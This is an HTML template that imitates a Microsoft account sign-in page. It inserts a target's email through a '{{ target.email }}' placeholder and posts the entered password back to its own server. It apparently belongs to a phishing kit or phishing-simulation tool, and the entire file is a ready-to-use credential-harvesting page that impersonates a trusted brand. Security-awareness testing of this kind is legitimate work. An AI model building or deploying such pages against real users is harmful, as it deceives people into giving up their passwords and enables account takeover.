<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Sign in - Microsoft</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body {
        font-family: "Segoe UI", sans-serif;
        background: #f2f2f2;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      .box {
        background: white;
        padding: 44px;
        width: 100%;
        max-width: 440px;
        border-radius: 2px;
      }
      .logo {
        font-size: 22px;
        font-weight: 600;
        color: #1a1a1a;
        margin-bottom: 24px;
      }
      .logo span {
        color: #0078d4;
      }
      h1 {
        font-size: 24px;
        font-weight: 600;
        margin-bottom: 16px;
      }
      p {
        font-size: 14px;
        color: #333;
        margin-bottom: 24px;
      }
      input {
        width: 100%;
        padding: 10px 12px;
        border: 1px solid #ccc;
        font-size: 14px;
        margin-bottom: 16px;
        border-radius: 2px;
      }
      input:focus {
        outline: 2px solid #0078d4;
        border-color: transparent;
      }
      .btn {
        width: 100%;
        padding: 12px;
        background: #0078d4;
        color: white;
        border: none;
        font-size: 14px;
        cursor: pointer;
        border-radius: 2px;
      }
      .btn:hover {
        background: #106ebe;
      }
      .footer {
        margin-top: 24px;
        font-size: 12px;
        color: #888;
      }
    </style>
  </head>
  <body>
    <div class="box">
      <div class="logo"><span>Microsoft</span></div>
      <h1>Sign in</h1>
      <p>{{ target.email }}</p>
      <form method="POST">
        <input
          type="password"
          name="password"
          placeholder="Password"
          required
          autofocus
        />
        <button type="submit" class="btn">Sign in</button>
      </form>
      <div class="footer">
        <a href="#" style="color: #0078d4; text-decoration: none"
          >Forgot password?</a
        >
        &nbsp;·&nbsp;
        <a href="#" style="color: #0078d4; text-decoration: none"
          >Sign-in options</a
        >
      </div>
    </div>
  </body>
</html>
